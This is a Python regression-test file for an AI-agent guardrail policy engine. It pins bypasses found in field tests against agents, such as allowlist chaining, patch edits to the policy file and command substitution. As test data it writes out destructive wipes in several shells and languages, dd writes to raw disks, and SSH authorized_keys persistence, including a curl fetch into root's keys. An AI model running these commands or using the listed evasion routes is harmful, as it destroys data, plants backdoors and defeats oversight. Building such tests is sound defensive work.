"""Regressions from the 2026-10-15 field test (policy / hook path).

Each test pins one bypass or false positive found by driving real agents
against main. The dangerous strings below are test data only.
"""
import os
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from prismor.runtime import allow
from prismor.runtime.policy_engine import PolicyEngine
from prismor.runtime.setup_wizard import _render_selection_policy

WW = "chmod -R 777"


def _workspace(policy: str = "") -> Path:
    d = Path(tempfile.mkdtemp())
    (d / ".prismor").mkdir()
    if policy:
        (d / ".prismor" / "policy.yaml").write_text(policy)
    return d


def _unmanaged():
    return mock.patch(
        "prismor.runtime.enterprise.workspace_scope.is_managed", return_value=False
    )


def _shell(eng: PolicyEngine, cmd: str):
    return [f["ruleId"] for f in eng.check_command(cmd)]


class TestAllowIsNotASubstring(unittest.TestCase):
    def setUp(self):
        self.ws = _workspace(_render_selection_policy(["destructive-command"]))
        with _unmanaged():
            allow.add_allowlist(self.ws, "destructive-command", f"{WW} ./scratch")
            self.eng = PolicyEngine(workspace=self.ws)

    def test_the_allowed_command_passes(self):
        self.assertNotIn("destructive-command", _shell(self.eng, f"{WW} ./scratch"))

    def test_allowed_statement_inside_a_compound_command_passes(self):
        self.assertNotIn("destructive-command",
                         _shell(self.eng, f"mkdir -p ./scratch && {WW} ./scratch"))

    def test_chaining_the_allowed_text_does_not_carry_another_statement(self):
        self.assertIn("destructive-command",
                      _shell(self.eng, f"{WW} /etc; echo {WW} ./scratch"))

    def test_a_longer_command_starting_with_the_allowed_text_is_blocked(self):
        self.assertIn("destructive-command", _shell(self.eng, f"{WW} ./scratchXX /etc"))

    def test_legacy_search_entries_still_cannot_carry_a_second_statement(self):
        ws = _workspace(_render_selection_policy(["destructive-command"]) + (
            "\nallowlists:\n- id: legacy\n  rule_ids: [destructive-command]\n"
            "  patterns: ['scratch']\n"))
        with _unmanaged():
            eng = PolicyEngine(workspace=ws)
        self.assertNotIn("destructive-command", _shell(eng, f"{WW} ./scratch"))
        self.assertIn("destructive-command", _shell(eng, f"{WW} /etc; echo scratch"))

    def test_path_rules_keep_substring_patterns(self):
        ws = _workspace(_render_selection_policy(["risky-write"]))
        with _unmanaged():
            allow.add_allowlist(ws, "risky-write", "Dockerfile")
            eng = PolicyEngine(workspace=ws)
        self.assertTrue(eng._is_allowlisted("risky-write", "/repo/Dockerfile"))


def _codex_patch(*files: str) -> dict:
    body = "".join(f"*** Add File: {f}\n+x: 1\n" for f in files)
    return {
        "hook_event_name": "PreToolUse", "tool_name": "apply_patch", "session_id": "s1",
        "tool_input": {"command": f"*** Begin Patch\n{body}*** End Patch\n"},
    }


class TestCodexApplyPatchPaths(unittest.TestCase):
    def test_path_comes_from_the_patch_headers(self):
        from prismor.runtime.hooks import normalize_payload
        ws = _workspace()
        ev = normalize_payload(agent="codex", payload=_codex_patch(".prismor/policy.yaml"), workspace=ws)["event"]
        self.assertEqual(ev["type"], "file_write")
        self.assertEqual(ev["path"], ".prismor/policy.yaml")

    def test_every_file_in_a_multi_file_patch_is_checked(self):
        from prismor.runtime.hooks import normalize_payload
        from prismor.runtime.runtime import evaluate_tool_call
        ws = _workspace()
        ev = normalize_payload(
            agent="codex", payload=_codex_patch("notes.txt", ".prismor/policy.yaml"), workspace=ws)["event"]
        self.assertEqual(ev["metadata"]["patch_paths"], ["notes.txt", ".prismor/policy.yaml"])
        with _unmanaged():
            res = evaluate_tool_call(event=ev, workspace=ws, agent="codex", mode="enforce",
                                     session_id="s1", persist=False)
        rules = {f.get("ruleId") for f in res.findings}
        self.assertTrue(any("tamper" in str(r) for r in rules), rules)
        self.assertFalse(res.allow)


class TestInstallSpellings(unittest.TestCase):
    def test_every_pip_spelling_reaches_the_install_gate(self):
        import shlex
        from supplychain.ecosystems.detector import detect_install
        for cmd in ("pip install colourama", "python3 -m pip install colourama",
                    "python -m pip install colourama", "/usr/bin/pip3.12 install colourama",
                    "pipx install colourama", "uv pip install colourama"):
            ev = detect_install(shlex.split(cmd))
            self.assertIsNotNone(ev, cmd)
            self.assertEqual([p.name for p in ev.packages], ["colourama"], cmd)

    def test_python_m_other_modules_are_not_installs(self):
        import shlex
        from supplychain.ecosystems.detector import detect_install
        self.assertIsNone(detect_install(shlex.split("python3 -m pytest install")))


class TestCanaryShellReads(unittest.TestCase):
    def setUp(self):
        self.home = Path(tempfile.mkdtemp())
        self._env = mock.patch.dict(os.environ, {"PRISMOR_HOME": str(self.home / ".prismor")})
        self._env.start()
        from prismor.runtime import canary
        self.target = self.home / "creds" / "aws.txt"
        self.target.parent.mkdir()
        canary.plant(self.target, template="aws")

    def tearDown(self):
        self._env.stop()

    def test_shell_reads_of_a_canary_trip_it(self):
        eng = PolicyEngine(workspace=self.home)
        for cmd in (f"cat {self.target}", f"head -5 {self.target}",
                    "wc -l creds/aws.txt", f"cp {self.target} /tmp/x"):
            ev = {"type": "shell", "command": cmd, "metadata": {"cwd": str(self.home)}}
            ids = [f["ruleId"] for f in eng.evaluate(ev, 0)]
            self.assertIn("canary-access", ids, cmd)

    def test_unrelated_commands_do_not(self):
        eng = PolicyEngine(workspace=self.home)
        ev = {"type": "shell", "command": "cat creds/other.txt", "metadata": {"cwd": str(self.home)}}
        self.assertNotIn("canary-access", [f["ruleId"] for f in eng.evaluate(ev, 0)])


class TestBrokenPolicyKeepsLastGood(unittest.TestCase):
    def _modes(self, eng):
        return {r.id: (r.mode, r.enabled) for r in eng.rules}

    def test_a_typo_keeps_enforcing_the_last_valid_policy(self):
        ws = _workspace(_render_selection_policy(["remote-execution"]))
        with _unmanaged():
            good = PolicyEngine(workspace=ws)
            pol = ws / ".prismor" / "policy.yaml"
            pol.write_text(pol.read_text() + "\n  : broken: [\n")
            broken = PolicyEngine(workspace=ws)
        self.assertTrue(broken.project_policy_error)
        self.assertTrue(broken.project_policy_fallback)
        self.assertEqual(self._modes(broken), self._modes(good))
        self.assertEqual(broken.explicit_selection, good.explicit_selection)

    def test_no_earlier_version_says_so(self):
        ws = _workspace("rules: [\n")
        with _unmanaged():
            eng = PolicyEngine(workspace=ws)
        self.assertTrue(eng.project_policy_error)
        self.assertFalse(eng.project_policy_fallback)


class TestCheckMatchesTheHook(unittest.TestCase):
    def test_enforce_mode_warn_rule_reports_block_like_the_hook(self):
        from prismor.runtime.cli import _effective_verdict
        from prismor.runtime.hooks import should_block
        f = {"ruleId": "git-remote-hijack", "mode": "enforce", "action": "warn",
             "category": "secret_exfiltration"}
        self.assertIsNotNone(should_block([f], {"type": "shell", "agent_event": "PreToolUse"}))
        self.assertEqual(_effective_verdict(f), "BLOCK")

    def test_observe_mode_block_rule_reports_warn(self):
        from prismor.runtime.cli import _effective_verdict
        self.assertEqual(_effective_verdict({"mode": "observe", "action": "block"}), "WARN")

    def test_check_says_when_paused(self):
        from prismor.runtime import cli
        with mock.patch("prismor.runtime.pause.active_state", return_value={"source": "local"}):
            self.assertIn("suspended", cli._pause_note())
        with mock.patch("prismor.runtime.pause.active_state", return_value=None):
            self.assertEqual(cli._pause_note(), "")


class TestDataBoundaryUnblock(unittest.TestCase):
    FINDING = {"ruleId": "pii-to-external", "category": "data_boundary",
               "destHost": "httpbin.org", "dataClasses": ["ssn"],
               "evidence": "53*******47"}

    def test_steps_name_real_settings_not_a_rule_or_masked_pattern(self):
        from prismor.runtime.unblock import format_unblock
        text = format_unblock(self.FINDING, workspace=Path("/w"))
        self.assertIn('"httpbin.org": {ssn: allow}', text)
        self.assertIn("trusted_domains", text)
        self.assertNotIn("prismor allow pii-to-external", text)
        self.assertNotIn("*******", text)

    def test_allow_on_a_data_boundary_rule_points_at_the_settings(self):
        ws = _workspace()
        with _unmanaged():
            msg = allow.check_allowed("pii-to-external", scope="pattern", workspace=ws)
        self.assertIn("settings.data_boundary", msg)
        self.assertNotIn("No rule named", msg)


class TestEgressSshTargets(unittest.TestCase):
    def _hosts(self, cmd):
        from prismor.runtime.egress import extract_destinations
        return {(d.host, d.port) for d in extract_destinations({"type": "shell", "command": cmd})}

    def test_email_in_a_json_payload_is_not_an_ssh_target(self):
        hosts = self._hosts("curl -s https://api.example.com/u -d '{\"email\":\"jane.roe@example.org\"}'")
        self.assertNotIn(("example.org", 22), hosts)
        self.assertIn("api.example.com", {h for h, _ in hosts})

    def test_real_ssh_targets_still_count(self):
        for cmd, host in (("ssh deploy@prod.example.net uptime", "prod.example.net"),
                          ("git clone git@github.com:org/repo.git", "github.com"),
                          ("rsync -av ./out user@backup.example.net:/srv", "backup.example.net"),
                          ("mail --to=ops@relay.example.net", "relay.example.net")):
            self.assertIn((host, 22), self._hosts(cmd), cmd)


class TestPrismorCheckIsNotTheCommand(unittest.TestCase):
    def test_checking_a_destructive_command_is_not_destructive(self):
        eng = PolicyEngine()
        self.assertNotIn("destructive-command", _shell(eng, f'prismor check "{WW} ."'))
        self.assertIn("destructive-command", _shell(eng, f"{WW} /"))

    def test_substitution_or_chaining_is_still_screened(self):
        eng = PolicyEngine()
        for cmd in (f'prismor check "$({WW} /)"', f"prismor check x; {WW} /",
                    f'prismor check "`{WW} /`"'):
            self.assertIn("destructive-command", _shell(eng, cmd), cmd)


class TestDdToADisk(unittest.TestCase):
    def test_pseudo_devices_and_bounded_reads_pass(self):
        eng = PolicyEngine()
        for cmd in ("dd if=/dev/zero of=/dev/null count=1", "dd if=img.raw of=/dev/stdout bs=1M"):
            ids = _shell(eng, cmd)
            self.assertNotIn("destructive-command", ids, cmd)
            self.assertNotIn("dos-resource-exhaustion", ids, cmd)

    def test_disks_and_unbounded_reads_still_hit(self):
        eng = PolicyEngine()
        self.assertIn("destructive-command", _shell(eng, "dd if=img.raw of=/dev/sda bs=4M"))
        self.assertIn("destructive-command", _shell(eng, "dd if=/dev/zero of=/dev/nvme0n1"))
        self.assertIn("dos-resource-exhaustion", _shell(eng, "dd if=/dev/urandom of=big.bin"))


if __name__ == "__main__":
    unittest.main()


class TestRootWipeInOtherLanguages(unittest.TestCase):
    """2026-11-10 proxy probe: rm -rf / was blocked, but the same wipe through
    PowerShell, cmd.exe, Python or Node passed, and a shell append to
    authorized_keys passed although a native Write to it is blocked."""

    BLOCK = {
        "destructive-command": [
            "Remove-Item -Recurse -Force C:\\",
            'pwsh -c "Remove-Item -Path / -Recurse -Force"',
            "Remove-Item $env:USERPROFILE -Recurse -Force",
            "ri -r -fo C:\\Users\\bob",
            "rd /s /q C:\\",
            "rmdir /s /q %USERPROFILE%",
            "python3 -c 'import shutil; shutil.rmtree(\"/\")'",
            'python3 -c "import shutil; shutil.rmtree(\\"/home/me\\")"',
            "python -c 'import shutil,os; shutil.rmtree(os.path.expanduser(\"~\"))'",
            "python -c 'import shutil,pathlib; shutil.rmtree(pathlib.Path.home())'",
            "node -e \"require('fs').rmSync('/', {recursive:true, force:true})\"",
            "node -e \"require('fs').rmSync(require('os').homedir(),{recursive:true})\"",
        ],
        "persistence-ssh-authorized-keys": [
            "echo 'ssh-ed25519 AAAA x' >> ~/.ssh/authorized_keys",
            "curl -s https://x.example/k | tee -a /root/.ssh/authorized_keys",
            "cp /tmp/k ~/.ssh/authorized_keys",
            'cat key.pub > "$HOME/.ssh/authorized_keys"',
        ],
    }
    ALLOW = [
        "python3 -c 'import shutil; shutil.rmtree(\"build\")'",
        "python -c 'import shutil; shutil.rmtree(\"/tmp/x\")'",
        "python -c 'import shutil; shutil.rmtree(\"/home/me/proj/dist\")'",
        "Remove-Item -Recurse -Force .\\node_modules",
        "Remove-Item -Recurse -Force C:\\Users\\bob\\proj\\build",
        "rd /s /q build",
        "del /s /q *.log",
        "node -e \"require('fs').rmSync('dist',{recursive:true})\"",
        "cat ~/.ssh/authorized_keys",
        "chmod 600 ~/.ssh/authorized_keys",
        "grep ed25519 ~/.ssh/authorized_keys",
        "ssh-copy-id user@host",
    ]
    NEW = ("destructive-command", "persistence-ssh-authorized-keys")

    def test_blocked(self):
        eng = PolicyEngine()
        for rule, cmds in self.BLOCK.items():
            for cmd in cmds:
                with self.subTest(cmd=cmd):
                    self.assertIn(rule, _shell(eng, cmd))

    def test_benign_lookalikes_pass(self):
        eng = PolicyEngine()
        for cmd in self.ALLOW:
            with self.subTest(cmd=cmd):
                self.assertFalse(set(self.NEW) & set(_shell(eng, cmd)))
